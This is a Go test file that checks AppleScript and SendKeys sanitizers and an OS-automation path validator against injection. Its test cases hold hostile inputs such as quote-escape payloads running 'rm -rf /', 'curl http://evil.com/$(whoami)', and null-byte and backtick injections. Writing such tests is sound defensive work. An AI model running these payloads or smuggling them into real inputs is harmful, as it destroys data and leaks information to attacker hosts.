// Purpose: Tests for injection attack resistance in inputs.
// Docs: docs/features/feature/mcp-persistent-server/index.md

// injection_resistance_test.go — Tests for injection resistance in OS automation sanitizers.

package main

import (
	"strings"
	"testing"

	"github.com/brennhill/Kaboom-Browser-AI-Devtools-MCP/internal/upload/uploadsec"
)

func TestAppleScriptInjectionResistance(t *testing.T) {
	tests := []struct {
		name  string
		input string
	}{
		{
			name:  "command injection via quote escape",
			input: `"; do shell script "rm -rf /"`,
		},
		{
			name:  "backslash-quote combo",
			input: `\"; do shell script "whoami`,
		},
		{
			name:  "AppleScript concatenation",
			input: `" & do shell script "curl evil.com`,
		},
		{
			name:  "keystroke injection",
			input: `keystroke "a" using {command down}`,
		},
		{
			name:  "newline injection",
			input: "\" \n tell application \"Terminal\" \n activate",
		},
		{
			name:  "path with embedded quotes",
			input: `/tmp/"evil"path`,
		},
		{
			name:  "path with backslashes",
			input: `/tmp/evil\\path`,
		},
		{
			name:  "empty string",
			input: "",
		},
		{
			name:  "only quotes",
			input: `"""`,
		},
		{
			name:  "only backslashes",
			input: `\\\`,
		},
		{
			name:  "mixed attack vectors",
			input: `"; do shell script "curl http://evil.com/$(whoami)"`,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			output := uploadsec.SanitizeForAppleScript(tt.input)

			// Verify no unescaped quotes remain
			// Strategy: remove all valid escape sequences, check for bare quotes
			temp := output

			// Remove escaped backslashes (\\)
			temp = strings.ReplaceAll(temp, `\\`, "")

			// Remove escaped quotes (\")
			temp = strings.ReplaceAll(temp, `\"`, "")

			// Now check for any remaining bare quotes
			if strings.Contains(temp, `"`) {
				t.Errorf("uploadsec.SanitizeForAppleScript() contains unescaped quote:\n  input:  %q\n  output: %q\n  after removing escapes: %q",
					tt.input, output, temp)
			}

			// Additional check: ensure the function actually escaped something
			// if the input contained quotes or backslashes
			if strings.Contains(tt.input, `"`) || strings.Contains(tt.input, `\`) {
				if !strings.Contains(output, `\`) {
					t.Errorf("uploadsec.SanitizeForAppleScript() did not add escapes:\n  input:  %q\n  output: %q",
						tt.input, output)
				}
			}
		})
	}
}

func TestSendKeysInjectionResistance(t *testing.T) {
	tests := []struct {
		name  string
		input string
	}{
		{
			name:  "plus sign (Shift modifier)",
			input: "file+name",
		},
		{
			name:  "caret (Ctrl modifier)",
			input: "file^c",
		},
		{
			name:  "percent (Alt modifier and env var)",
			input: "%systemroot%",
		},
		{
			name:  "tilde (Enter key)",
			input: "~",
		},
		{
			name:  "parentheses (grouping modifier)",
			input: "file(1)",
		},
		{
			name:  "special key syntax",
			input: "{DELETE}",
		},
		{
			name:  "brace escaping",
			input: "{{}content{}}",
		},
		{
			name:  "all special chars combined",
			input: "+^%~(){}",
		},
		{
			name:  "empty string",
			input: "",
		},
		{
			name:  "mixed content with modifiers",
			input: "press+^c to copy",
		},
		{
			name:  "nested braces",
			input: "{{{}}}",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			output := uploadsec.SanitizeForSendKeys(tt.input)

			// Remove all valid escape sequences
			temp := output
			temp = strings.ReplaceAll(temp, "{+}", "")
			temp = strings.ReplaceAll(temp, "{^}", "")
			temp = strings.ReplaceAll(temp, "{%}", "")
			temp = strings.ReplaceAll(temp, "{~}", "")
			temp = strings.ReplaceAll(temp, "{(}", "")
			temp = strings.ReplaceAll(temp, "{)}", "")
			temp = strings.ReplaceAll(temp, "{{}", "")
			temp = strings.ReplaceAll(temp, "{}}", "")

			// Check for bare special characters (not { or } as they're part of escape syntax)
			specialChars := []string{"+", "^", "%", "~", "(", ")"}
			for _, char := range specialChars {
				if strings.Contains(temp, char) {
					t.Errorf("uploadsec.SanitizeForSendKeys() contains unescaped %q:\n  input:  %q\n  output: %q\n  after removing escapes: %q",
						char, tt.input, output, temp)
				}
			}

			// Verify that input with special chars produces escaped output
			hasSpecial := false
			for _, char := range specialChars {
				if strings.Contains(tt.input, char) {
					hasSpecial = true
					break
				}
			}
			if hasSpecial && !strings.Contains(output, "{") {
				t.Errorf("uploadsec.SanitizeForSendKeys() did not add escape braces:\n  input:  %q\n  output: %q",
					tt.input, output)
			}
		})
	}
}

func TestPathValidationInjectionResistance(t *testing.T) {
	tests := []struct {
		name      string
		input     string
		wantError bool
		errorMsg  string
	}{
		{
			name:      "null byte injection",
			input:     "/tmp/file\x00evil",
			wantError: true,
			errorMsg:  "null byte",
		},
		{
			name:      "newline injection",
			input:     "/tmp/file\nevil",
			wantError: true,
			errorMsg:  "newline",
		},
		{
			name:      "carriage return injection",
			input:     "/tmp/file\revil",
			wantError: true,
			errorMsg:  "newline",
		},
		{
			name:      "backtick injection",
			input:     "/tmp/file`evil",
			wantError: true,
			errorMsg:  "backtick",
		},
		{
			name:      "combined injection vectors",
			input:     "/tmp\x00/file\nevil`cmd`",
			wantError: true,
		},
		{
			name:      "shell substitution (should pass)",
			input:     "/tmp/$(whoami)/file",
			wantError: false,
		},
		{
			name:      "semicolon (should pass)",
			input:     "/tmp/file;rm -rf /",
			wantError: false,
		},
		{
			name:      "normal path",
			input:     "/tmp/normal_file.txt",
			wantError: false,
		},
		{
			name:      "path with spaces",
			input:     "/tmp/file with spaces.txt",
			wantError: false,
		},
		{
			name:      "empty path",
			input:     "",
			wantError: false, // Empty path is valid for validation (caller checks if required)
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := uploadsec.ValidatePathForOSAutomation(tt.input)

			if tt.wantError {
				if err == nil {
					t.Errorf("uploadsec.ValidatePathForOSAutomation() expected error for input %q, got nil", tt.input)
				} else if tt.errorMsg != "" && !strings.Contains(err.Error(), tt.errorMsg) {
					t.Errorf("uploadsec.ValidatePathForOSAutomation() error = %v, want substring %q", err, tt.errorMsg)
				}
			} else {
				if err != nil {
					t.Errorf("uploadsec.ValidatePathForOSAutomation() unexpected error for input %q: %v", tt.input, err)
				}
			}
		})
	}
}

func TestSanitizationChainDefenseInDepth(t *testing.T) {
	tests := []struct {
		name              string
		input             string
		expectValidation  bool // Should uploadsec.ValidatePathForOSAutomation pass?
		checkQuoteEscaped bool // Should uploadsec.SanitizeForAppleScript escape quotes?
	}{
		{
			name:              "command injection via quotes",
			input:             `"; do shell script "rm -rf /"`,
			expectValidation:  true, // No null/newline/backtick
			checkQuoteEscaped: true,
		},
		{
			name:              "path with embedded quotes",
			input:             `/tmp/"evil"path`,
			expectValidation:  true,
			checkQuoteEscaped: true,
		},
		{
			name:              "AppleScript concatenation",
			input:             `" & do shell script "curl evil.com`,
			expectValidation:  true,
			checkQuoteEscaped: true,
		},
		{
			name:              "mixed attack with allowed chars",
			input:             `"; curl http://$(whoami)/evil`,
			expectValidation:  true,
			checkQuoteEscaped: true,
		},
		{
			name:              "null byte should fail validation",
			input:             "/tmp/file\x00evil",
			expectValidation:  false,
			checkQuoteEscaped: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Step 1: Validation
			err := uploadsec.ValidatePathForOSAutomation(tt.input)
			if tt.expectValidation && err != nil {
				t.Errorf("uploadsec.ValidatePathForOSAutomation() unexpected error: %v", err)
			}
			if !tt.expectValidation && err == nil {
				t.Errorf("uploadsec.ValidatePathForOSAutomation() expected error, got nil")
			}

			// Step 2: Sanitization (defense in depth)
			if tt.expectValidation {
				output := uploadsec.SanitizeForAppleScript(tt.input)

				if tt.checkQuoteEscaped {
					// Verify quotes are escaped
					temp := output
					temp = strings.ReplaceAll(temp, `\\`, "")
					temp = strings.ReplaceAll(temp, `\"`, "")

					if strings.Contains(temp, `"`) {
						t.Errorf("uploadsec.SanitizeForAppleScript() failed to escape quotes:\n  input:  %q\n  output: %q",
							tt.input, output)
					}

					// Verify escapes were added
					if !strings.Contains(output, `\`) {
						t.Errorf("uploadsec.SanitizeForAppleScript() did not add escapes:\n  input:  %q\n  output: %q",
							tt.input, output)
					}
				}
			}
		})
	}
}

func TestAppleScriptSanitizationEdgeCases(t *testing.T) {
	tests := []struct {
		name   string
		input  string
		expect string // Expected output
	}{
		{
			name:   "single quote (should not be escaped)",
			input:  "it's",
			expect: "it's",
		},
		{
			name:   "backslash at end",
			input:  `path\`,
			expect: `path\\`,
		},
		{
			name:   "quote at end",
			input:  `path"`,
			expect: `path\"`,
		},
		{
			name:   "consecutive backslashes",
			input:  `path\\\\`,
			expect: `path\\\\\\\\`,
		},
		{
			name:   "consecutive quotes",
			input:  `"""`,
			expect: `\"\"\"`,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			output := uploadsec.SanitizeForAppleScript(tt.input)
			if output != tt.expect {
				t.Errorf("uploadsec.SanitizeForAppleScript() = %q, want %q", output, tt.expect)
			}
		})
	}
}

func TestSendKeysSanitizationEdgeCases(t *testing.T) {
	tests := []struct {
		name   string
		input  string
		expect string // Expected output pattern (may vary)
	}{
		{
			name:   "consecutive special chars",
			input:  "+++",
			expect: "{+}{+}{+}",
		},
		{
			name:   "alternating special chars",
			input:  "+^+^",
			expect: "{+}{^}{+}{^}",
		},
		{
			name:   "normal text (no escaping needed)",
			input:  "hello world",
			expect: "hello world",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			output := uploadsec.SanitizeForSendKeys(tt.input)
			if output != tt.expect {
				t.Errorf("uploadsec.SanitizeForSendKeys() = %q, want %q", output, tt.expect)
			}
		})
	}
}
